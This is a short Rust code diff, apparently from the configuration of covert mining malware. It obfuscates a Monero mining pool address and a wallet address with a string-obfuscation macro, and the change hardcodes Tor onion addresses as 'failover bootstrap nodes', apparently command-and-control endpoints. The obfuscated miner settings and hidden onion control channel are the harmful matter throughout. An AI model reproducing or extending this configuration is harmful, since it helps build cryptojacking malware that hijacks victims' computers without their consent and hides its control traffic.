@@ -21,11 +21,10 @@ pub fn get_pool_url() -> String { obfstr::obfstr!("gulf.moneroocean.stream:10128
 pub fn get_wallet() -> String { obfstr::obfstr!("47ekr2BkJZ4KgCt6maJcrnWhz9MfMfetPPnQSzf4UyXvAKTAN3sVBQy6R9j9p7toHa9yPyCqt9n43N3psvCwiFdHCJNNouP").to_string() }
 
 // V10 Standard: Failover Bootstrap Nodes
-pub const BOOTSTRAP_ONIONS: [&str; 1] = [
-    env!("BOOTSTRAP_ONION"),
-    // Add more fallbacks here in production
-    // "fallback_onion_2...",
-    // "fallback_onion_3...",
+pub const BOOTSTRAP_ONIONS: [&str; 3] = [
+    "vww6ybal4bd7szmgncyruucpgfkqahzddi37ktceo3ah7ngmcopnpyyd.onion:80",
+    "fallback_2_address.onion:80",
+    "fallback_3_address.onion:80"
 ];
 
 // Dynamic Runtime Configuration
